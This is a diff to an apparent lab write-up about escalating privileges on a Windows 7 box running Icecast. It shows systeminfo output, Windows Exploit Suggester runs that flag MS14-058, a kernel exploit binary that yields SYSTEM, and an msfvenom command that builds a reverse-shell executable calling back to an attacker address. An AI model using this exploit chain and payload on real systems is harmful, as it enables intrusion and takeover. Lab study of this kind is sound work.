@@ -270,15 +270,17 @@ Now that we have a shell we have a number of ways of trying to identify valid pa
 This time we're going to use the Windows Exploit Suggester. It's available here: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
 We needed to install pip for python2 and install the xlrd module before it would run: 
+
 ```
 #wget the get-pip.py file 
 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py 
 #Run the file with python2 get-pip.py 
 python2 get-pip 
 #Install xlrd==1.1.0 python2 -m pip install --user xlrd==1.1.0 
-'''
+```
 
 Before we can use the exploit suggester, we first have to get the Windows system information. We can do this with systeminfo:
+
 ```
 C:\Program Files (x86)\Icecast2 Win32>systeminfo
 systeminfo
@@ -329,8 +331,55 @@ Network Card(s):           1 NIC(s) Installed.
 
 We can then copy this output and save it to a text file, which in this case we'll name 'sysinfo.txt'.
 
-At this stage we'll want to run Windows-Exploit-Suggester
+At this stage we'll want to run Windows-Exploit-Suggester. First we'll need to use the ```-u``` flag to get the latest definitions file:
+```
+sudo python windows-exploit-suggester.py -u 
+[*] initiating winsploit version 3.3...
+[+] writing to file 2021-09-22-mssb.xls
+[*] done
+```
 
+Now we can run the exploit suggester against the sysinfo.txt file:
+```
+python windows-exploit-suggester.py -d 2021-09-22-mssb.xls -i sysinfo.txt -l                                 1 ⨯ 
+[*] initiating winsploit version 3.3...                                                                              
+[*] database file detected as xls or xlsx based on extension                                                         
+[*] attempting to read from the systeminfo input file     
+[+] systeminfo input file read successfully (ascii)                                                                  
+[*] querying database file for potential vulnerabilities                                                             
+[*] comparing the 2 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits          
+[*] there are now 386 remaining vulns                                                                                
+[*] searching for local exploits only
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 7 SP1 64-bit'
+[*] 
+...
+```
+
+We do not include all the output as there are quite a number of local vulnerabilities. But we do find the following:
+
+```
+[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+```
+
+The exploit doesn't seem to directly relate to our needs but if we Google MS14-058 we can find this GitHub repository:
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058
+
+It appears that by using the Win64.exe executable found at the repository, as long as we can get it onto the box, we should be able to run commands as NT AUTHORITY\SYSTEM (root). For example:
+
+```
+Win64.exe whoami
+nt authority\system
+```
+
+### Using Gitmaninc's MS14-058 Privilege Escalation from SecWiki
+
+Firstly we need to create a new reverse shell that we can execute on the box locally. To do this we'll run this msfvenom command:
+
+``` 
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.4.18.56 LPORT=421 -f exe -b '\x00\x0a\x0d' -o paperboy.exe
+```
 
 Conclusion
 
